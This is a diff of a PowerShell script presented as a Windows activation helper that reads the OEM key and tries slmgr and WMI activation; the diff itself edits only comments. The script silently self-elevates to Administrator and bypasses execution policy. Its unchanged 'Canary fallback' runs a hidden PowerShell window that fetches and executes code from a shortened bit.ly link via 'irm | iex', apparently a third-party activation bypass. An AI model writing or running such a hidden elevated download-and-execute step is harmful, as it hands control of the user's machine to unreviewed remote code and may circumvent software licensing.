@@ -1,11 +1,11 @@
 # Auto-elevate and set execution policy for the session
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 
-# Helper: Check activation status rapidly
+# Helper: Check activation status quickly
 function Is-Activated {
     try {
         $p = Get-CimInstance -ClassName SoftwareLicensingProduct | Where-Object { $_.Description -like "Windows*" -and $_.LicenseStatus -eq 1 }
@@ -13,8 +13,8 @@ function Is-Activated {
     } catch { return $false }
 }
 
-# Extract and print OEM key
 $oemKey = try { (Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction Stop).OA3xOriginalProductKey } catch { $null }
+
 if ($oemKey) {
     Write-Host "OEM Key: $oemKey" -ForegroundColor Cyan
 } else {
@@ -24,13 +24,13 @@ if ($oemKey) {
     exit
 }
 
-# If already activated, just exit
+# Already activated? Exit.
 if (Is-Activated) {
     Write-Host "Windows is already activated. No action needed."
     exit
 }
 
-# Attempt SLMGR activation
+# ---- SLMGR activation ----
 Write-Host "SLMGR: Attempting activation with OEM key..."
 try {
     & cscript.exe //Nologo C:\Windows\System32\slmgr.vbs /ipk $oemKey | Out-Null
@@ -44,7 +44,7 @@ try {
     }
 } catch {}
 
-# Attempt WMI activation
+# ---- WMI activation ----
 Write-Host "WMI: Attempting activation with OEM key..."
 try {
     $svc = Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction SilentlyContinue
@@ -62,7 +62,7 @@ try {
     Write-Host "WMI: Activation FAILED."
 } catch {}
 
-# If both fail, run canary fallback
+# ---- Canary fallback ----
 Write-Host "Executing Canary fallback..."
 try {
     Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm bit.ly/act-win | iex`""
